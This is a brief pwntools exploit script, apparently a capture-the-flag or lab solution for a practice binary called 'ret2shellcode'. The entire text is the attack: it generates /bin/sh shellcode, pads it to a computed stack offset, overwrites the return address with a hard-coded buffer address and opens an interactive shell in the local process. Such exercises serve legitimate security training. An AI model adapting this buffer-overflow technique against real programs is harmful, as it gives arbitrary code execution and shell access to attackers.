from pwn import *

eax=0xffffcfcc
ebp=0xffffd038
buf2_addr=0x0804A080
shellcode=asm(shellcraft.sh())
print('shellcode length:%d'%(len(shellcode)))
offset=ebp-eax+4
shellcode_pad=shellcode+(offset-len(shellcode))*b'A'
sh=process('./ret2shellcode')
sh.sendline(shellcode_pad+p32(buf2_addr))
sh.interactive()
